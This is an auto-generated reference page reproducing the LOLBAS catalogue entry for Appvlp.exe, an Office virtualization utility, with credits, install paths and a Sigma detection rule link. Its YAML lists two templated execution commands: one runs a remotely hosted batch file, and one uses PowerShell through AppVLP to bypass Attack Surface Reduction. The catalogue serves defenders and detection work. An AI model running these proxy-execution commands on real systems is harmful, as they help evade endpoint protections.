---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Appvlp.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `appvlp.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Appvlp.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Appvlp.exe](../../tools/windows/appvlp.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | appvlp.exe |
| name | Appvlp.exe |
| type | tool |
| source | lolbas |
| url | https://enigma0x3.net/2018/06/11/the-tale-of-settingcontent-ms-files/ |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@0rbz_'
  Person: fab
- Handle: '@moo_hax'
  Person: Will
- Handle: '@enigma0x3'
  Person: Matt Wilson
Author: Oddvar Moe
Commands:
- Category: Execute
  Command: AppVLP.exe {PATH_SMB:.bat}
  Description: Executes .bat file through AppVLP.exe
  MitreID: T1218
  OperatingSystem: Windows 10 w/Office 2016
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Execution of BAT file hosted on Webdav server.
- Category: Execute
  Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '',
    'open', 1)"
  Description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
  MitreID: T1218
  OperatingSystem: Windows 10 w/Office 2016
  Privileges: User
  Tags:
  - Execute: EXE
  Usecase: Local execution of process bypassing Attack Surface Reduction (ASR).
Created: 2018-05-25
Description: Application Virtualization Utility Included with Microsoft Office 2016
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_appvlp.yml
Full_Path:
- Path: C:\Program Files\Microsoft Office\root\client\appvlp.exe
- Path: C:\Program Files (x86)\Microsoft Office\root\client\appvlp.exe
Name: Appvlp.exe
Resources:
- Link: https://github.com/MoooKitty/Code-Execution
- Link: https://twitter.com/moo_hax/status/892388990686347264
- Link: https://enigma0x3.net/2018/06/11/the-tale-of-settingcontent-ms-files/
- Link: https://securityboulevard.com/2018/07/attackers-test-new-document-attack-vector-that-slips-past-office-defenses/
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Appvlp.yml
```

## Detection / Analysis Notes

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_appvlp.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_appvlp.yml
```
